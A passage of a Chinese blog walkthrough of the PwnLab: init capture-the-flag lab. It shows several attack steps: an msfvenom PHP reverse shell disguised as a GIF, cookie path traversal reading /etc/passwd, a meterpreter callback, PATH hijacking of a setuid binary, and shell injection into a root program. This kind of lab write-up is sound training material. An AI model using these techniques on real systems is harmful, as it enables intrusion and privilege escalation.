array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br><span class="line"></span><br><span class="line">		if (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">			die(&apos;Not allowed extension, please upload images only.&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(strpos($filetype,&apos;image&apos;) === false) &#123;</span><br><span class="line">			die(&apos;Error 001&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if($imageinfo[&apos;mime&apos;] != &apos;image/gif&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpeg&apos; &amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/jpg&apos;&amp;&amp; $imageinfo[&apos;mime&apos;] != &apos;image/png&apos;) &#123;</span><br><span class="line">			die(&apos;Error 002&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(substr_count($filetype, &apos;/&apos;)&gt;1)&#123;</span><br><span class="line">			die(&apos;Error 003&apos;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$uploadfile = $uploaddir . md5(basename($_FILES[&apos;file&apos;][&apos;name&apos;])).$file_ext;</span><br><span class="line"></span><br><span class="line">		if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $uploadfile)) &#123;</span><br><span class="line">			echo &quot;&lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br /&gt;&quot;;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			die(&apos;Error 4&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;%</span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>在上面已经拿到了MySQL的账号密码了，而且在用nmap扫的时候已经发现3306端口是开放的。</li>
+<li><code>mysql -h 192.168.7.130 -u root -D Users -p</code>密码是config文件的那个，自行解密。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_Users |</span><br><span class="line">+-----------------+</span><br><span class="line">| users           |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+------+------------------+</span><br><span class="line">| user | pass             |</span><br><span class="line">+------+------------------+</span><br><span class="line">| kent | Sld6WHVCSkpOeQ== |---JWzXuBJJNy</span><br><span class="line">| mike | U0lmZHNURW42SQ== |---SIfdsTEn6I</span><br><span class="line">| kane | aVN2NVltMkdSbw== |---iSv5Ym2GRo</span><br><span class="line">+------+------------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+<ol start="9">
+<li>登录上传文件试试，上面的源码已经知道只能上传图片后缀的文件，而且还判了文件类型和mime</li>
+</ol>
+<h3 id="绕过上传"><a href="#绕过上传" class="headerlink" title="绕过上传"></a>绕过上传</h3><ul>
+<li>方法1：在木马上加图片标志绕过</li>
+</ul>
+<ol>
+<li><code>echo GIF89a &gt; kali.gif</code></li>
+<li><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.7.1 LPORT=7788 R &gt;&gt;kali.gif</code></li>
+</ol>
+<ul>
+<li>方法2：上BurpSuite，你们比我熟练。</li>
+</ul>
+<ol>
+<li>上传之后会返回一个相对路径就是文件的md5<code>upload/51c65dd716e81189745d6eb1c9f1bb6b.gif</code></li>
+<li>直接打开是不会解析的，但是index文件那还有一个文件包含，文件路径可以通过cookie传进去</li>
+<li><code>curl --cookie &quot;lang=../../../../../../etc/passwd&quot; &quot;http://192.168.7.130&quot;</code></li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">Debian-exim:x:104:109::/var/spool/exim4:/bin/false</span><br><span class="line">messagebus:x:105:110::/var/run/dbus:/bin/false</span><br><span class="line">statd:x:106:65534::/var/lib/nfs:/bin/false</span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br><span class="line">kent:x:1001:1001:,,,:/home/kent:/bin/bash</span><br><span class="line">mike:x:1002:1002:,,,:/home/mike:/bin/bash</span><br><span class="line">kane:x:1003:1003:,,,:/home/kane:/bin/bash</span><br><span class="line">mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src="images/pwnlab.png"&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href="/"&gt;Home&lt;/a&gt; ] [ &lt;a href="?page=login"&gt;Login&lt;/a&gt; ] [ &lt;a href="?page=upload"&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line">Use this server to upload and share image files inside the intranet&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;%</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>发现可以，把<code>../../../../etc/passwd</code>换刚刚上传的木马路径</li>
+<li><code>curl --cookie &quot;lang=../upload/51c65dd716e81189745d6eb1c9f1bb6b.gif&quot; &quot;http://192.168.7.130&quot;</code></li>
+<li>发现meterpreter那边已经获取到回话了。</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 192.168.7.1:7788 </span><br><span class="line">[*] Meterpreter session 1 opened (192.168.7.1:7788 -&gt; 192.168.7.130:55888) at 2018-07-10 14:19:16 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol>
+<li>还是以前的套路<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>拿数据库的密码去登录各个用户</li>
+<li>发现kane的密码可以登录，在他的home目录找到了一个属于mike用户的ELF可执行文件</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ file msgmike</span><br><span class="line">file msgmike</span><br><span class="line">msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped</span><br><span class="line"></span><br><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">cat: /home/mike/msg.txt: No such file or directory</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>执行报没有mike用户目录下的文件，把他下载回来，先用Python中的<code>python -m SimpleHTTPServer</code>搭建一个简单的http服务。浏览器打开<code>192.168.7.130:8000</code></li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:26] "GET / HTTP/1.1" 200 -</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:26] code 404, message File not found</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:26] "GET /favicon.ico HTTP/1.1" 404 -</span><br><span class="line">192.168.7.1 - - [10/Jul/2018 02:39:28] "GET /msgmike HTTP/1.1" 200 -</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li><p>简单拖进IDA看看<code>cat /home/mike/msg.txt</code>它使用了带参数的系统函数，我们把环境变量改为当前目录。</p>
+</li>
+<li><p>可以修改PATH变量，从而将这个“cat”转换为shell：</p>
+</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">cat: /home/mike/msg.txt: No such file or directory</span><br><span class="line">kane@pwnlab:~$ echo "/bin/bash" &gt; cat  </span><br><span class="line">echo "/bin/bash" &gt; cat</span><br><span class="line">kane@pwnlab:~$ ls</span><br><span class="line">ls</span><br><span class="line">cat  msgmike</span><br><span class="line">kane@pwnlab:~$ chmod 777 cat</span><br><span class="line">chmod 777 cat</span><br><span class="line">kane@pwnlab:~$ export PATH=/home/kane</span><br><span class="line">export PATH=/home/kane</span><br><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">bash: dircolors: command not found</span><br><span class="line">bash: ls: command not found</span><br><span class="line">mike@pwnlab:~$</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>现在用户变成Mike了，再把PATH改回来<code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>就可以了。现在到Mike的home目录发现有一个文件<code>msg2root</code>继续拖进IDA发现<code>&quot;/bin/echo %s &gt;&gt; /root/messages.txt&quot;</code></li>
+<li>这是把用户传进的字符串打印出来，但如果字符串里有分隔符的话就可能跟着执行了下一个命令。而且是root权限。</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message for root: id ; whoami</span><br><span class="line">id ; whoami</span><br><span class="line">id</span><br><span class="line">root</span><br><span class="line">mike@pwnlab:/home/mike$ </span><br><span class="line"></span><br><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message for root: asdasdasdas;/bin/sh</span><br><span class="line">asdasdasdas;/bin/sh</span><br><span class="line">asdasdasdas</span><br><span class="line">id</span><br><span class="line">uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">flag.txt  messages.txt</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.-=~=-.                                                                 .-=~=-.</span><br><span class="line">(__  <span class="keyword">_</span>)-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-(__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___)  _____                             <span class="keyword">_</span>                            (<span class="keyword">_</span> ___)</span><br><span class="line">(__  <span class="keyword">_</span>) /  __ \                           | <span class="type">|                           (__</span>  <span class="keyword">_</span>)</span><br><span class="line">( <span class="keyword">_</span> __) | <span class="type">/  \/ ___</span>  <span class="keyword">_</span> __   __ <span class="keyword">_</span> <span class="keyword">_</span> __ __ <span class="keyword">_</span>| <span class="type">|_</span> ___                      ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>) | <span class="type">|    / _</span> \| <span class="type">'_</span> \ / <span class="keyword">_</span>` | <span class="type">'__</span>/ <span class="keyword">_</span>` | <span class="type">__</span>/ __|                     <span class="type">(__</span>  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___) | <span class="type">\__</span>/\ (<span class="keyword">_</span>) | <span class="type">| | | (_</span>| <span class="type">| | | (_</span>| <span class="type">| |_</span>\__ \                     (<span class="keyword">_</span> ___)</span><br><span class="line">(__  <span class="keyword">_</span>)  \____/\___/|<span class="type">_</span>| <span class="type">|_</span>|<span class="type">\__</span>, |<span class="type">_</span>|  <span class="type">\__</span>,<span class="keyword">_</span>|<span class="type">\__</span>|<span class="type">___</span>/                     (__  <span class="keyword">_</span>)</span><br><span class="line">( <span class="keyword">_</span> __)                     __/ |                                       <span class="type">( _</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>)                    |<span class="type">___</span>/                                        (__  <span class="keyword">_</span>)</span><br><span class="line">(__  <span class="keyword">_</span>)                                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___) <span class="keyword">If</span>  you are  reading this,  means  that you have  break 'init'  (<span class="keyword">_</span> ___)</span><br><span class="line">( <span class="keyword">_</span> __) Pwnlab.  I hope  you enjoyed  and thanks  <span class="keyword">for</span>  your <span class="built_in">time</span> doing  ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>) this challenge.                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___)                                                                 (<span class="keyword">_</span> ___)</span><br><span class="line">( <span class="keyword">_</span> __) Please send me  your  feedback or your  writeup,  I will  love  ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>) reading it                                                      (__  <span class="keyword">_</span>)</span><br><span class="line">(__  <span class="keyword">_</span>)                                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(__  <span class="keyword">_</span>)                                             For sniferl4bs.com  (__  <span class="keyword">_</span>)</span><br><span class="line">( <span class="keyword">_</span> __)                                claor@PwnLab.net - @Chronicoder  ( <span class="keyword">_</span> __)</span><br><span class="line">(__  <span class="keyword">_</span>)                                                                 (__  <span class="keyword">_</span>)</span><br><span class="line">(<span class="keyword">_</span> ___)-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-=-.<span class="keyword">_</span>.-(<span class="keyword">_</span> ___)</span><br><span class="line">`-.<span class="keyword">_</span>.-'                                                                 `-.<span class="keyword">_</span>.-'</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/$projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#关于"><span class="toc-number">1.</span> <span class="toc-text">关于</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过上传"><span class="toc-number">3.</span> <span class="toc-text">绕过上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&text=[Write-up]-pwnlab_init"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&is_video=false&description=[Write-up]-pwnlab_init"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[Write-up]-pwnlab_init&body=Check out this article: https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&title=[Write-up]-pwnlab_init"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://kali-team.cn/2018/07/10/Write-up-pwnlab-init/&name=[Write-up]-pwnlab_init&description=&lt;h3 id=&#34;关于&#34;&gt;&lt;a href=&#34;#关于&#34; class=&#34;headerlink&#34; title=&#34;关于&#34;&gt;&lt;/a&gt;关于&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;下载地址&lt;a href=&#34;https://download.vulnhub.com/pwnlab/pwnlab_init.ova&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;点我&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Flag: /root/flag.txt&lt;/li&gt;
+&lt;li&gt;放假的第一天&lt;/li&gt;
+&lt;li&gt;哔哩哔哩&lt;a href=&#34;https://www.bilibili.com/video/av26578404/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;视频&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a href=&#34;#信息收集&#34; class=&#34;headerlink&#34; title=&#34;信息收集&#34;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nmap -sn 192.168.7.1/24 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap scan report for 192.168.7.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host is up (0.00071s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap scan report for 192.168.7.130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host is up (0.00060s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap done: 256 IP addresses (2 hosts up) scanned in 2.39 seconds&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-10 12:55 CST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap scan report for 192.168.7.130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host is up (0.00098s latency).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Not shown: 997 closed ports&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80/tcp   open  http    Apache httpd 2.4.10 ((Debian))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_http-server-header: Apache/2.4.10 (Debian)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_http-title: PwnLab Intranet Image Hosting&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111/tcp  open  rpcbind 2-4 (RPC #100000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| rpcinfo: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   program version   port/proto  service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   100000  2,3,4        111/tcp  rpcbind&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   100000  2,3,4        111/udp  rpcbind&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   100024  1          44040/tcp  status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_  100024  1          51756/udp  status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| mysql-info: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Protocol: 53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Version: .5.47-0+deb8u1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Thread ID: 84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Capabilities flags: 63487&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Some Capabilities: SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, ConnectWithDatabase, Speaks41ProtocolOld, 